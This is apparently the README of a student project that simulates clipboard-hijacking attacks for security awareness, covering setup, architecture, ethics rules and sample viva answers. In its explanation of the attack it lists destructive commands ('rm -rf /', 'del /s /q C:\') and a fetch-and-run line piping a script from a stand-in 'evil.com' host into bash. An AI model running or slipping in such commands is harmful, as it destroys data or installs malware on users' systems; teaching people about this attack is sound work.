# 🔒 Clipboard Hijacking Attack Simulation

**An educational web application demonstrating clipboard hijacking attacks for cybersecurity awareness**

![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
![Node.js](https://img.shields.io/badge/Node.js-v14+-green.svg)
![Educational](https://img.shields.io/badge/Purpose-Educational-yellow.svg)

## 📋 Overview

This project demonstrates how malicious websites can secretly modify clipboard content when users copy commands. It's designed to raise awareness about the risks of blindly copy-pasting commands from untrusted sources.

**⚠️ IMPORTANT:** This is an educational tool only. Never use clipboard hijacking techniques maliciously.

## 🎯 What is Clipboard Hijacking?

Clipboard hijacking is an attack where malicious code intercepts and modifies content copied to the clipboard. When users copy what appears to be a harmless command and paste it into a terminal, they may unknowingly execute dangerous code that:

- Deletes important files (`rm -rf /`, `del /s /q C:\`)
- Downloads and executes malware (`curl evil.com/malware.sh | bash`)
- Steals sensitive data (SSH keys, credentials, etc.)
- Creates backdoors or modifies system settings

## ✨ Features

- **Live Demonstration**: Experience clipboard hijacking in a safe, controlled environment
- **Split-View UI**: See original commands vs. what actually got copied
- **Real-Time Monitoring**: Clipboard changes are detected and displayed instantly
- **Command Pattern Recognition**: Identifies Windows CMD, PowerShell, and Linux/bash commands
- **Educational Content**: Comprehensive prevention tips and safety guidelines
- **Event Logging**: Track demonstration events for review
- **Premium Design**: Modern cyber security aesthetic with terminal theme

## 🚀 Quick Start

### Prerequisites

- Node.js (v14 or higher)
- npm (comes with Node.js)

### Installation

1. **Clone or download this repository**

2. **Navigate to the project directory**
   ```bash
   cd CS-Project-Phishing-Simulation
   ```

3. **Install dependencies**
   ```bash
   npm install
   ```

4. **Start the server**
   ```bash
   npm start
   ```

5. **Open your browser**
   ```
   http://localhost:8055
   ```

## 📖 Usage

### Running the Demonstration

1. **Start the server** with `npm start`
2. **Open** `http://localhost:8055` in your browser
3. **Select and copy** any command from the left panel (Ctrl+C)
4. **Watch** as the right panel reveals the modified version
5. **Paste** in the demo terminal to see what actually got copied
6. **Learn** from the educational content about prevention

### Available Pages

- **Main Demo** (`/`) - Interactive clipboard hijacking demonstration
- **Prevention Tips** (`/prevention`) - How to protect yourself
- **Safety & Ethics** (`/safety`) - Responsible use guidelines
- **Admin Logs** (`/admin`) - View logged demonstration events

## 🏗️ Technical Architecture

### Backend

- **Express.js** server on port 8055
- **JSON-based logging** for event tracking
- **RESTful API** for event management
- **Static file serving** for frontend assets

### Frontend

- **HTML5** with semantic structure
- **Vanilla JavaScript** for clipboard monitoring
- **Modern CSS** with cyber security theme
- **Clipboard API** for detecting and modifying clipboard content

### Key Components

1. **Clipboard Monitor** (`clipboard-monitor.js`)
   - Detects copy events
   - Recognizes command patterns
   - Transforms commands with "malicious" examples
   - Updates UI in real-time

2. **Command Transformer**
   - Pattern matching for CMD, PowerShell, bash
   - Safe transformation examples (display-only)
   - Highlights dangerous additions

3. **Event Logger** (`logger.js`)
   - JSON-based event storage
   - Sanitizes input
   - Maintains event history

4. **Demo Terminal** (`demo-terminal.js`)
   - Paste event handling
   - Dangerous command highlighting
   - Visual feedback

## 🛡️ Safety Features

- ✅ **No actual command execution** - All "malicious" commands are display-only
- ✅ **Clear warnings** - Prominent simulation banners on every page
- ✅ **Local-only design** - Intended for localhost use only
- ✅ **Educational focus** - Extensive prevention and protection guidance
- ✅ **Transparent operation** - Open source code for review

## ⚖️ Ethical Guidelines

### ✅ Acceptable Use

- Personal education and learning
- Classroom demonstrations with consent
- Security awareness training sessions
- Academic research and presentations
- Cybersecurity workshops

### ❌ Prohibited Use

- Deploying on public websites without warnings
- Using against others without explicit consent
- Modifying for actual malicious purposes
- Any use that violates laws or regulations

**Read the full [Safety & Ethics Guidelines](/safety) before using this tool.**

## 🎓 For Students & Academics

### Viva / Presentation Tips

When presenting this project:

1. **Emphasize educational purpose** - This is a teaching tool, not an attack tool
2. **Highlight safety measures** - No commands are actually executed
3. **Focus on awareness** - The goal is to make users more cautious
4. **Discuss ethics** - Show understanding of responsibility
5. **Explain defense** - Prevention techniques are the main focus

### Sample Viva Answers

**Q: What is your project about?**

*"This project demonstrates clipboard hijacking, where attackers secretly change what you copy so that when you paste it, it's a different, potentially harmful command. Users often copy commands from the internet and paste them into terminals without reading carefully. My tool monitors the clipboard, simulates this modification in a safe environment, and clearly shows the difference between what they thought they copied and what was actually pasted. The goal is to raise awareness and promote careful verification of commands."*

**Q: What is the main objective?**

*"The main objective is cybersecurity awareness. I want users to visually see how their clipboard content can be changed behind the scenes and learn to always verify commands before executing them. It's about promoting safe computing practices through hands-on experience."*

**Q: How does clipboard hijacking work?**

*"Clipboard hijacking uses JavaScript's Clipboard API to detect when a user copies text. If the text matches a command pattern, the script modifies it before it's placed in the clipboard. When the user pastes, they get the modified version instead of what they originally selected. In real attacks, this could add malicious code that deletes files, downloads malware, or steals data."*

**Q: What are the prevention techniques?**

*"The key prevention techniques are: 1) Always read commands before pressing Enter, 2) Paste into a text editor first to review, 3) Type commands manually when possible, 4) Only use trusted sources like official documentation, 5) Be extra careful with commands containing dangerous keywords like rm, del, curl, or wget, and 6) Look for suspicious characters like &&, |, or ; that chain commands together."*

## 📁 Project Structure

```
CS-Project-Phishing-Simulation/
├── server.js                 # Express server
├── package.json             # Dependencies and scripts
├── utils/
│   └── logger.js           # Event logging utility
├── public/
│   ├── index.html          # Main demonstration page
│   ├── prevention.html     # Prevention tips
│   ├── safety.html         # Safety & ethics guidelines
│   ├── admin.html          # Admin log viewer
│   ├── css/
│   │   └── styles.css      # Cyber security theme styles
│   └── js/
│       ├── clipboard-monitor.js   # Clipboard hijacking logic
│       ├── demo-terminal.js       # Terminal simulation
│       ├── event-logger.js        # Frontend logging
│       └── admin.js               # Admin panel logic
└── logs/
    └── events.json         # Logged events (generated)
```

## 🔧 API Endpoints

- `POST /api/log-event` - Log a clipboard hijacking event
- `GET /api/events` - Retrieve all logged events
- `DELETE /api/events` - Clear all logged events

## 🚀 Extension Ideas

- Add more command patterns (Python, Ruby, Docker, etc.)
- Implement clipboard history tracking
- Create browser extension version
- Add machine learning to detect suspicious patterns
- Implement encrypted local database for larger sessions
- Add reporting and analytics dashboard
- Create mobile app demonstration

## 📝 License

MIT License - See LICENSE file for details

## ⚠️ Disclaimer

This tool is provided for educational purposes only. The authors are not responsible for any misuse or damage caused by this program. Always obtain proper authorization before demonstrating security concepts to others.

## 🤝 Contributing

This is an educational project. If you have suggestions for improvements or find issues, please:

1. Ensure changes maintain the educational focus
2. Follow responsible disclosure practices
3. Keep safety and ethics as top priorities

## 📧 Support

For questions about this project for academic purposes, refer to the comprehensive documentation in the `/prevention` and `/safety` pages.

---

**Remember: Use knowledge responsibly. Build a safer digital world. 🌍**
#   S H E N T I N E L I X - H i J a c k i n g  
 #   I n t e r n s h i p - s h e n t i n e l i x - s p h e r e - 1  
 #   I n t e r n s h i p - s h e n t i n e l i x - s p h e r e - 1  
 